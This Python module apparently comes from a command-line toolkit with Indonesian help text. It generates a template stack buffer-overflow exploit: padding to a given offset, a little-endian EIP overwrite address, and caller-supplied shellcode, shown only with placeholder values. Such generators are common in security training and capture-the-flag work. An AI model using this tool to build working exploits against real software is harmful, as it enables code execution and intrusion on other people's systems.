import argparse
import textwrap

def to_little_endian(hexstr):
    hexstr = hexstr.replace("0x", "")
    bytes_list = [hexstr[i:i+2] for i in range(0, len(hexstr), 2)]
    bytes_list.reverse()
    return ''.join(f"\\x{b}" for b in bytes_list)

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx zkf --type e3p",
        description="Template Exploit Buffer Overflow (Python format)",
        epilog="Contoh: --offset 260 --eip 0xdeadbeef --shellcode \\x90\\x90\\x90\\xcc"
    )

    parser.add_argument("--offset", type=int, required=True, help="Jumlah padding sebelum EIP")
    parser.add_argument("--eip", required=True, help="Alamat EIP (hex)")
    parser.add_argument("--shellcode", required=True, help="Shellcode dalam bentuk escaped string")

    args = parser.parse_args(raw_args)

    eip_bytes = to_little_endian(args.eip[2:] if args.eip.startswith("0x") else args.eip)

    code = f'''
    #!/usr/bin/env python3

    payload = b"A" * {args.offset}
    payload += b"{eip_bytes}"
    payload += b"{args.shellcode}"

    print(payload)
    '''

    return textwrap.dedent(code).strip()
